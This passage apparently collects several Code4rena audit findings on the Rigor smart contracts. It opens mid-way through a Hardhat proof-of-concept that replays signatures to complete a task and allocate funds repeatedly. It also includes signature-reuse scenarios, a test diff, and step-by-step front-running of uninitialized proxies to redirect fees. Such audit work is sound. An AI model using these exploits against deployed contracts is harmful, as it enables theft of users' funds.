(!contractorDelegated) {         changeSignersAddress.unshift(builder);       }       changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);       const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));        // console.log({ changeSignersAddress })       return await multisig(data, dataSigners);     }      async function changeSC(encodedData: string, signature: string) {       const tx = await project.changeOrder(encodedData, signature);       tx.wait();       await expect(tx).to.emit(project, 'ChangeOrderSC');     }   });     it('PoC change cost', async () => {     const taskID = 1;     let taskDetails = await project.getTask(taskID);     const originalSC = taskDetails.subcontractor;     const originalCost = taskCost;      const veryHighNewCost = taskCost * 10;     console.log(taskDetails);     // await (await project.inviteSC([taskID], [signers[2].address])).wait();      const changeToNewData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, originalSC, veryHighNewCost, project.address],     };     const changeToNewSignedData = await signData(changeToNewData);      await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);      const changeBackToOldData = {       types: ['uint256', 'address', 'uint256', 'address'],       values: [taskID, originalSC, originalCost, project.address],     };     const changeBackToOldSignedData = await signData(changeBackToOldData);      await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);     taskDetails = await project.getTask(taskID);      await expect(taskDetails.cost).to.be.equal(originalCost);      const originalSCSigner = getSignerByAddress(signers, originalSC);     await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();      // for some reason if you don't do this you get 'Mock on the method is not initialized' error     await mockDAIContract.mock.transfer       .withArgs(originalSC, taskCost)       .returns(true);     await mockDAIContract.mock.transfer       .withArgs(await homeFiContract.treasury(), taskCost / 1e3)       .returns(true);       const setCompleteData = {       types: ['uint256', 'address'],       values: [taskID, project.address],     };     let setCompleteSignedData = await signData(setCompleteData);     let tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);       // attack start     await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);     await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);      await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();        tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);      await changeCost(changeToNewSignedData[0], changeToNewSignedData[1]);     await changeCost(changeBackToOldSignedData[0], changeBackToOldSignedData[1]);      await (await project.connect(originalSCSigner).acceptInviteSC([taskID])).wait();     await project.allocateFunds();      tx = await project.setComplete(setCompleteSignedData[0], setCompleteSignedData[1]);     await expect(tx).to.emit(project, 'TaskComplete').withArgs(taskID);          async function signData(data: DataType) {       let contractor = await project.contractor();       let builder = await project.builder();       let taskDetails = await project.getTask(taskID);       let sc = taskDetails.subcontractor;       // console.log({ contractor, builder, sc })        let changeSignersAddress = [contractor, sc];       let contractorDelegated = await project.contractorDelegated();       if (!contractorDelegated) {         changeSignersAddress.unshift(builder);       }       changeSignersAddress = changeSignersAddress.filter(x => x !== ethers.constants.AddressZero);       const dataSigners = changeSignersAddress.map(signer => getSignerByAddress(signers, signer));        // console.log({ changeSignersAddress })       return await multisig(data, dataSigners);     }      async function changeCost(encodedData: string, signature: string) {       const tx = await project.changeOrder(encodedData, signature);       tx.wait();       // await expect(tx).to.emit(project, 'ChangeOrderSC');     }   });  ```  ## Tools Used Hardhat  ## Recommended Mitigation Steps  * Use nonce to protect `setComplete()` and `changeOrder()` from signatures reuse * Add the `onlyActive()` modifier to `Tasks.unApprove()` * Consider limiting `allocateFunds()` for builder only (this is not necessary to resolve the bug, just for hardening security)
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L859   # Vulnerability details  ## Impact & Proof Of Concept When a contractor (let's say Bob) is also a subcontractor (which can be a valid scenario), it is not possible to use the hash approval feature for `checkSignatureTask`. The first call to `checkSignatureValidity` will already delete `approvedHashes[address(Bob)][_hash]`, the second call therefore fails.  Note that the same situation would also be possible for builder == contractor, or builder == subcontractor, although those situations are probably less likely to occur.  ## Recommended Mitigation Steps Delete the approval only when all checks are done.
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L267   # Vulnerability details  ## Impact When a project is unpublished from a community, it can still owe money to this community (on which it needs to pay interest according to the specified APR). However, when the project is later published again in this community, the APR can be overwritten and the overwritten APR is used for the calculation of the interest for the old project (when it was unpublished).  ## Proof Of Concept 1.) Project A is published in community I with an APR of 3%. The community lends 1,000,000 USD to the project. 2.) Project A is unpublished, the `lentAmount` is still 1,000,000 USD. 3.) During one year, no calls to `repayLender`, `reduceDebt`, or `escrow` happens, i.e. the interest is never added and the `lastTimestamp` not updated. 4.) After one year, the project is published again in the same community. Because the FED raised interest rates, it is specified that the APR should be 5% from now on. 5.) Another $1,000,000 is lent to the project by calling `lendToProject`. Now, `claimInterest` is called which calculates the interest of the last year for the first million. However, the function already uses the new APR of 5%, meaning the added interest is 50,000 USD instead of the correct 30,000 USD.   ## Recommended Mitigation Steps When publishing a project, if the `lentAmount` for the community is non-zero, calculate the interest before updating the APR.
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L175 https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L213 https://github.com/code-423n4/2022-08-rigor/blob/e35f5f61be9ff4b8dc5153e313419ac42964d1fd/contracts/Community.sol#L530 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Disputes.sol#L91 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L142 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L167 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L235 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L286 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L346 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L402 https://github.com/code-423n4/2022-08-rigor/blob/f2498c86dbd0e265f82ec76d9ec576442e896a87/contracts/Project.sol#L499   # Vulnerability details  ## Impact & Proof Of Concepts In many places of the project (see affected code), untyped application data is directly hashed and signed. This is strongly disencouraged, as it enables different attacks (that each could be considered their own issue / vulnerability, but I submitted it as one, as they have all the same root cause):  1.) Signature reuse across different Rigor projects: While some signature contain the project address, not all do. For instance, `updateProjectHash` only contains a `_hash` and a `_nonce`. Therefore, we can have the following scenario: Bob is the owner of project A and signs / submit `updateProjectHash` with nonce 0 and some hash. Then, a project B that also has Bob as the owner is created. Attacker Charlie can simply take the `_data` and `_signature` that Bob previously submitted to project A and send it to project B. As this project will have a nonce of 0 (fresh created), it will accept it. `updateTaskHash` is also affected by this. 2.) Signature reuse across different chains: Because the chain ID is not included in the data, all signatures are also valid when the project is launched on a chain with another chain ID. For instance, let's say it is also launched on Polygon. An attacker can now use all of the Ethereum signatures there. Because the Polygon addresses of user's (and potentially contracts, when the nonces for creating are the same) are often identical, there can be situations where the payload is meaningful on both chains. 3.) Signature reuse across Rigor functions: Some functions accept and decode data / signatures that were intended for other functions. For instance, see this example of providing the data & signature that was intended for `inviteContractor` to `setComplete`: ```diff diff --git a/test/utils/projectTests.ts b/test/utils/projectTests.ts index ae9e202..752e01f 100644 --- a/test/utils/projectTests.ts +++ b/test/utils/projectTests.ts @@ -441,7 +441,7 @@ export const projectTests = async ({      }    });  -  it('should be able to invite contractor', async () => { +  it.only('should be able to invite contractor', async () => {      expect(await project.contractor()).to.equal(ethers.constants.AddressZero);      const data = {        types: ['address', 'address'], @@ -452,6 +452,7 @@ export const projectTests = async ({        signers[1],      ]);      const tx = await project.inviteContractor(encodedData, signature); +    const tx2 = await project.setComplete(encodedData, signature);      await expect(tx)        .to.emit(project, 'ContractorInvited')        .withArgs(signers[1].address); ``` While this reverts because there is no task that corresponds to the address that is signed there, this is not always the case. 4.) Signature reuse from different Ethereum projects & phishing Because the payload of these signatures is very generic (two addresses, a byte and two uints), there might be situations where a user has already signed data with the same format for a completely different Ethereum application. Furthermore, an attacker could set up a DApp that uses the same format and trick someone into signing the data. Even a very security-conscious owner that has audited the contract of this DApp (that does not have any vulnerabilities and is not malicious, it simply consumes signatures that happen to have the same format) might be willing to sign data for this DApp, as he does not anticipate that this puts his Rigor project in danger.  ## Recommended Mitigation Steps I strongly recommend to follow [EIP-712](https://eips.ethereum.org/EIPS/eip-712) and not implement your own standard / solution. While this also improves the user experience, this topic is very complex and not easy to get right, so it is recommended to use a battle-tested approach that people have thought in detail about. All of the mentioned attacks are not possible with EIP-712: 1.) There is always a domain separator that includes the contract address. 2.) The chain ID is included in the domain separator 3.) There is a type hash (of the function name / parameters) 4.) The domain separator does not allow reuse across different projects, phishing with an innocent DApp is no longer possible (it would be shown to the user that he is signing data for Rigor, which he would off course not do on a different site)
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L92 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L113   # Vulnerability details  ## Impact The initialize function of the HomeFi contract does not emit the AdminReplaced event after setting the value of the  _msgSender() to be the admin.  Consider emitting events after sensitive changes occur to facilitate tracking and notify off-chain clients following the contractsâ€™ activity.  ## Proof of Concept  https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L92 https://github.com/code-423n4/2022-08-rigor/blob/main/contracts/HomeFi.sol#L113  ## Tools Used vscode ## Recommended Mitigation Steps add event
# Lines of code  https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L102-L119 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/DebtToken.sol#L43-L58 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Disputes.sol#L74-L81 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Project.sol#L94-L105 https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55   # Vulnerability details  ## Impact All next Impact depends on actions and attention from developers when deployed - Loss of funds  - Failure of the protocol, with the need for redeploy - Loss of control over protocol elements (some smart contracts) - The possibility of replacing contracts and settings with harmful ones And other things that come out of it...  ## Proof of Concept  For a proper understanding of Proof of Concept, you need to understand the following things: 1) Hardhat does not stop the process with a deploy and does not show failed transactions if they have occurred in some cases  2) Malicious agents can trace the protocol deployment transactions and insert their own transaction between them  Reason: - [During deploy TransparentUpgradeableProxy's](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFiProxy.sol#L216-L230) initialize method for initializing contracts not called. The third parameter responsible for this is an empty string. This causes the initialization process itself to be **delayed**  - Contract initialization methods have no check over who calls them Example [ProjectFactory.sol#L45-L55](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/ProjectFactory.sol#L45-L55)  **Also suitable for other contracts, strings are attached in Links to affected code **  Example of exploiting the vulnerability **Failure of the protocol, with the need for redeploy** && **Loss of control over protocol elements (some smart contracts)** : 1) User listen transaction in mempool, etherscan, transaction in block etc  2) Finds the moment of deployment and sends the transaction for setup his HomeFi address in Disputes contract:   Just he call initialize method and put his _homeFi parameter 3) In the event that hardhat tracked a failed transaction, the deployment will stop and you will need to start over. If the hardhead misses it and the developers do not check the result and the setting, access to this part will be lost and fix is needed  Example of exploiting the vulnerability **Loss of funds**: 1) User listen transaction in mempool, etherscan, transaction in block for listne when HomeFi will deployed 2) Send transaction for initialize [HomeFi](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/HomeFi.sol#L92-L120) with his _treasury address 3) Transfer the admin ownership the right to the real address to divert the eyes 4) The address of the treasury remains with the attacker 5) The protocol fees (fee) will be [transfered](https://github.com/code-423n4/2022-08-rigor/blob/5ab7ea84a1516cb726421ef690af5bc41029f88f/contracts/Community.sol#L443) to the attacker's address until it is detected   ## Recommended Mitigation Steps  Carry out checks at the initialization stage or redesign the deployment process with the initialization of contracts during deployment  
